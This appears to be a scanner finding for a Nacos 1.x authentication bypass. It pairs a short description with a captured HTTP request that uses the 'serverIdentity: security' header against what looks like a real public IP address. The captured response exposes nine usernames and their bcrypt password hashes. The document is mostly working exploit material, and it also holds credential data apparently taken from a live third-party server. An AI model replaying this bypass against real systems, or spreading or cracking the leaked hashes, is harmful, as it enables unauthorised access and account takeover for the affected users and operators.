info.name: Nacos 1.x - Authentication Bypass
info.author: taielab,pikpikcu,SleepingBag945
info.description: Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.

req_resp.req:
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
HOST: 106.52.93.192
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
serverIdentity: security
req_resp.resp:
HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Fri, 21 Mar 2025 14:30:01 GMT
Keep-Alive: timeout=60
Connection: keep-alive

{"totalCount":10,"pageNumber":1,"pagesAvailable":2,"pageItems":[{"username":"nacos","password":"$2a$10$I.9vv.aV/2l4fIdAiUaTx.2gat/UEE85nmypTWxrCx.JNMeJOzDKO"},{"username":"myworld7055","password":"$2a$10$9YMNbn31G5DtuLT.9MVDU.oECvzmhcyfDFTrDLgrOY/ZFkIbvST82"},{"username":"qqqwww1240","password":"$2a$10$5UXNbTrUcQXioajxRYYzRuNLiZ6zYfaTxjKLyMekXhcX5LdK0A.Sy"},{"username":"wwwdddd1223555","password":"$2a$10$T7tbnweDjKWHoymTIVV2n.PHnUikHKxWcueOkOEQrZIKdsFhvTKlO"},{"username":"abc123","password":"$2a$10$csJB00IaUw8PYpQgh3SNf.GdVtsZSX8s6kvezNkf.eRn./LBV/85W"},{"username":"test2","password":"$2a$10$whcbd/hE1X0AWTgDc8ldu.RUHpPUpypE0TTwzj7xmIJzy0tv62crm"},{"username":"ahai1234","password":"$2a$10$c1tlZAk76AVvtFU26WpB9.8Kz5aHO9ZjJJ2gVpESWmWTyWbQ/kPwG"},{"username":"haidan","password":"$2a$10$bgK9/TF0nYgUyuyGlmSOlOEbEodPiaiZFHLXE27.NJhTYtppduKom"},{"username":"NacosAD","password":"$2a$10$veqL2ZxvsCBfi6SSCg2nIOfGPSsFRFy4DkbkHj3olxNNsoHgiOdf."}]}
